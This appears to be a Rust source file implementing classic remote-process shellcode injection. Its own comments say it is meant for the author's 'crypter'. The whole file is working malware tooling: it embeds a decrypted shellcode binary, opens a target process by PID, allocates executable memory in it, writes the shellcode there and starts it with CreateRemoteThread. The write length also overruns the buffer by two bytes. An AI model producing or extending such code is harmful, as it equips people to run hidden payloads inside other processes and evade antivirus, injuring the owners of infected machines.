// goal of the project is to develop a function
// which injects bytes into memory
// so that i can use it later in my crypter

// Use the include_bytes! macro to include a binary file as a byte slice
static SHELLCODE: &[u8] = include_bytes!("C:\\Users\\Kris\\Desktop\\windows_igracho\\decrypted.bin");

use std::mem::transmute;
use std::fs::File;
use std::io::Read;
use std::ptr;
use windows::Win32::Foundation::{GetLastError, HANDLE};
use windows::core::Error;
use windows::Win32::System::Memory::{VirtualAllocEx,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use std::os::raw::c_void;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS};

fn main()-> Result<() , Box<dyn std::error::Error>>{
    let process_id:u32= 19528;
    let mut shellcode = SHELLCODE.to_vec();
    // file!include_bytes!(&mut shellcode)?;
    let dwsize = shellcode.len();

    unsafe {
        let process_handle = open_process(process_id)?;
        let base_address = allocate_memory(&process_handle, dwsize);
        let shellcode:Vec<u8> = shellcode;
        let success = write_in_memory(&process_handle, base_address,
                                      shellcode.as_ptr() as *const c_void, &(shellcode.len() + 2))?;

        let startaddress = Some(transmute(base_address));
        let thread_handle = create_thread_execution(&process_handle, startaddress)?;
    }
    println!("Done");
    Ok(())
}

unsafe fn open_process(id:u32)->Result<HANDLE , Error>{
    let desired_access = PROCESS_ALL_ACCESS;
    let result = OpenProcess(desired_access, false, id)?;
    Ok(result)
}

unsafe fn allocate_memory(handle:&HANDLE, dwsize:usize) -> *mut c_void{
    let lpaddress:Option<*const c_void> = None;

    let flallocationtype = MEM_COMMIT | MEM_RESERVE;
    let flprotect = PAGE_EXECUTE_READWRITE;
    let address = VirtualAllocEx(*handle , lpaddress , dwsize ,
                                            flallocationtype , flprotect);
    address
}

unsafe fn write_in_memory(
    handle:&HANDLE,
    addr: *mut c_void,
    shellcode:*const c_void ,
    nsize:&usize
) -> Result<() , Error>{
    let success = WriteProcessMemory(*handle , addr, shellcode , *nsize , None)?;

    Ok(success)
}

unsafe fn create_thread_execution(handle: &HANDLE, startaddress:LPTHREAD_START_ROUTINE) -> Result<HANDLE,Error>{
    let thread_handle = CreateRemoteThread(*handle , None , 0 ,startaddress , None ,0,None)?;

    Ok(thread_handle)

}


